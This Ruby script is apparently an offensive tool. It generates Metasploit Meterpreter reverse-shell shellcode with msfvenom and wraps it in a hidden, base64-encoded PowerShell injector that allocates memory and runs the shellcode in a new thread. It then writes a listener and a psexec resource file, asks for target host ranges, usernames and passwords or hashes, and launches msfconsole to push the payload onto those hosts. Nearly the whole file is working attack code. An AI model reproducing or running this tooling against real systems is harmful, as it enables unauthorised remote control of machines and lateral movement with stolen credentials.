#!/usr/bin/ruby
require 'base64'
def colorize(text, color_code)
  "\e[#{color_code}m#{text}\e[0m"
end
def red(text); colorize(text, 31); end
def green(text); colorize(text, 32); end
def blue(text); colorize(text, 34); end
def generate_powershell(msf_path,filePath,host,port,payload)
   if payload == 'windows/exec CMD=\"cmd /k calc\"' or payload== 'windows/x64/exec CMD=\"cmd /k calc\"'
      execute = `#{msf_path}./msfvenom -p #{payload} EXITFUNC=thread C`
      data = cleanData(execute)
   else
      execute  = `#{msf_path}./msfvenom --payload #{payload} LHOST=#{host} LPORT=#{port} C`
      data = cleanData(execute)
   end
      powershell_command = "$code = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = #{data};[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };"
   encode = Base64.encode64(powershell_command.encode("utf-16le")).delete("\r\n")
   power_exec = "powershell -noprofile -noninteractive -windowstyle hidden -EncodedCommand #{encode}"
   puts "#{green('[+]')} Writing command to #{filePath}#{payload.gsub('/','_').split[0]}"
   if not File.directory?(filePath)
      Dir.mkdir(filePath)
   end
   $payload_file = "#{filePath}#{payload.gsub('/','_').split[0]}"
   File.open("#{$payload_file}",'w') {|f| f.write(power_exec)}
end
def cleanData(data)
   data = data.gsub('\\',",0")
   data = data.delete("+")
   data = data.delete('"')
   data = data.delete("\n")
   data = data.delete("\s")
   data[0..4] = ''
   return data
end
def setup_metasploit(filePath,hostResults,portResults,payloadResults)
    f = File.open("#{filePath}listener.rc","w")
    f.write("use exploit/multi/handler\n")
    f.write("set PAYLOAD #{payloadResults}\n")
    f.write("set LHOST #{hostResults}\n")
    f.write("set LPORT #{portResults}\n")
    f.write("set ExitOnSession false\n")
    f.write("exploit -j -z")
    f.close
end
def host()
   address = `ifconfig | grep 'inet addr' | awk '{print $2}'`
   iface1 = address.chomp.delete("addr:").split[0]
   hostName = [(print "#{blue('[*]')} Enter the host ip to listen on or leave blank for [#{iface1}]: "), gets.rstrip][1]
   if hostName == ''
      hostName = '0.0.0.0'
   end
   puts "#{green('[+]')} Using #{hostName} as server"
   return hostName
end
def port()
   port = [(print "#{blue('[*]')} Enter the port you would like to use or leave blank for [443]: "), gets.rstrip][1]
   if port == ''
      port = '443'
      puts "#{green('[+]')} Using #{port}"
      return port
   elsif not (1..65535).cover?(port.to_i)
      puts "#{red('[-]')} Not a valid port"
      sleep(1)
      port()
   else 
      puts "#{green('[+]')} Using #{port}"
      return port
   end
end
def attack(msf_path,filePath)
    command = File.open("#{$payload_file}","r")
    host_range = [(print "#{blue('[*]')} Enter the host or range of hosts that you would like to attack: "), gets.rstrip][1]
    user_name = [(print "#{blue('[*]')} Enter the user name to login with: "), gets.rstrip][1]
    password = [(print "#{blue('[*]')} Enter the password or hash to use: "), gets.rstrip][1]
    domain = [(print "#{blue('[*]')} Enter the domain to use or leave blank for WORKGROUP: "), gets.rstrip][1]
    threads = [(print "#{blue('[*]')} How many threads would you like to use (default 10): "), gets.rstrip][1]
    if domain == ''
        domain = 'WORKGROUP'
    end
    if threads == ''
        threads = '10'
    end
    f = File.open("#{filePath}exploit.rc","w")
    f.write("use auxiliary/admin/smb/psexec_command\n")
    f.write("set RHOSTS #{host_range}\n")
    f.write("set SMBUser #{user_name}\n")
    f.write("set SMBPass #{password}\n")
    f.write("set SMBDomain #{domain}\n")
    f.write("set THREADS #{threads}\n")
    f.write("set COMMAND #{command.read}\n")
    f.write("run")
    f.close
    
    File.open("#{filePath}resource.rc","w") {|f| f.write("resource #{filePath}listener.rc #{filePath}exploit.rc")}
    
    puts "#{green('[+]')} Starting Metasploit"
    system("#{msf_path}./msfconsole -r #{filePath}resource.rc")
end
def payload_choice()
   system('clear') 
   payload = [(print "What Payload would you like to use?
      1) windows/meterpreter/reverse_tcp
      2) windows/meterpreter/reverse_https
      3) windows/x64/meterpreter/reverse_tcp
      4) windows/x64/exec cmd=calc.exe
      5) windows/exec cmd=calc.exe
      99) Exit
        
      #{blue('[*]')} "), gets.rstrip][1]
   case payload
   when '1'
      return "windows/meterpreter/reverse_tcp"
   when '2'
      return "windows/meterpreter/reverse_https"
   when '3'
      return "windows/x64/meterpreter/reverse_tcp"
   when '4'
      return "windows/x64/exec CMD=\"cmd /k calc\""
   when '5'
      return "windows/exec CMD=\"cmd /k calc\""
   when '99'
      puts "#{green('[+]')} Goodbye"
      exit
   else
      puts "#{red('[-]')} Incorrect choice"
      sleep(1)
      payload_choice()
   end
end
def main()
    filePath = '/root/.powershell_gen/'
    msf_path = '/opt/metasploit-framework/'
    payloadResults = payload_choice()
    if payloadResults == "windows/x64/exec CMD=\"cmd /k calc\"" or payloadResults == "windows/exec CMD=\"cmd /k calc\""
        puts "#{green('[+]')} Using #{payloadResults}"
        puts "#{green('[+]')} Generating shellcode"
        generate_powershell(msf_path,filePath,'','',payloadResults)
    else
        hostResults = host()
        portResults = port()
        puts "#{green('[+]')} Using #{payloadResults}"
        puts "#{green('[+]')} Generating shellcode"
        generate_powershell(msf_path,filePath,hostResults,portResults,payloadResults)
        setup_metasploit(filePath,hostResults,portResults,payloadResults)
        attack_hosts = attack(msf_path,filePath)
    end
end 
begin
   main()
end